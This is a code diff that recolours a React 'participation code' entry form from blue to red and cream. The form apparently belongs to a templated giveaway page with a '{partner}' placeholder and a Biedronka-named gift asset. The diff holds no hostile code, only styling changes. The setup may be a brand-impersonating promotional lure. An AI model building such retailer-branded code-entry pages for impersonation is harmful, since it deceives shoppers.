@@ -101,7 +101,7 @@ export function CodeEntryClient({
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[var(--brand)]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#f2d8c4] border-t-[var(--brand)]" />
         </div>
       </div>
     );
@@ -110,7 +110,7 @@ export function CodeEntryClient({
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#fff6ec] border border-[#f2d8c4] shadow-[0_20px_60px_rgba(107,10,10,0.15)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -120,7 +120,7 @@ export function CodeEntryClient({
   if (loading) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 flex justify-center py-16">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#fff6ec] border border-[#f2d8c4] shadow-[0_20px_60px_rgba(107,10,10,0.15)] p-5 sm:p-8 flex justify-center py-16">
           <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)] border-t-transparent" />
         </div>
       </div>
@@ -129,7 +129,7 @@ export function CodeEntryClient({
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#fff6ec] border border-[#f2d8c4] shadow-[0_20px_60px_rgba(107,10,10,0.15)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
@@ -146,7 +146,7 @@ export function CodeEntryClient({
             <img src="/form-assets/biedronka-gift-box.webp" alt="Gift box" className="h-12 w-12 object-contain" id="code-gift-icon" />
           </div>
           <div>
-            <h2 className="text-2xl font-bold text-[#0a2463] mb-1">{settings.code_title}</h2>
+            <h2 className="text-2xl font-bold text-[#6b0a0a] mb-1">{settings.code_title}</h2>
             <p className="text-sm text-gray-600 font-medium whitespace-pre-line">
               {settings.code_subtitle.split("{partner}").map((part, i, arr) => (
                 <span key={i}>
@@ -166,7 +166,7 @@ export function CodeEntryClient({
 
         <form onSubmit={handleSubmit} className="space-y-6">
           <div>
-            <label className="mb-2 block text-sm font-medium text-[#0a2463] text-left">Participation code</label>
+            <label className="mb-2 block text-sm font-medium text-[#6b0a0a] text-left">Participation code</label>
             <div className="relative">
               <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-4">
                 <img src="/form-assets/icon-security.webp" alt="" className="h-6 w-6 opacity-70" />
@@ -174,7 +174,7 @@ export function CodeEntryClient({
               <input
                 type="text"
                 required
-                className="w-full rounded-xl border border-transparent bg-[#f0f6fb] py-4 pl-12 pr-4 text-2xl font-bold tracking-widest text-[#0a2463] outline-none focus:border-[var(--brand)] focus:ring-2 focus:ring-[var(--brand)]/50 transition-all placeholder:text-gray-500 shadow-sm"
+                className="w-full rounded-xl border border-transparent bg-[#f0f6fb] py-4 pl-12 pr-4 text-2xl font-bold tracking-widest text-[#6b0a0a] outline-none focus:border-[var(--brand)] focus:ring-2 focus:ring-[var(--brand)]/50 transition-all placeholder:text-gray-500 shadow-sm"
                 value={enteredCode}
                 onChange={(e) => setEnteredCode(e.target.value)}
                 placeholder=""
@@ -185,7 +185,7 @@ export function CodeEntryClient({
           <button
             type="submit"
             disabled={processing}
-            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(0,83,159,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(221,26,33,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {processing ? "Przetwarzanie..." : settings.code_button}
           </button>
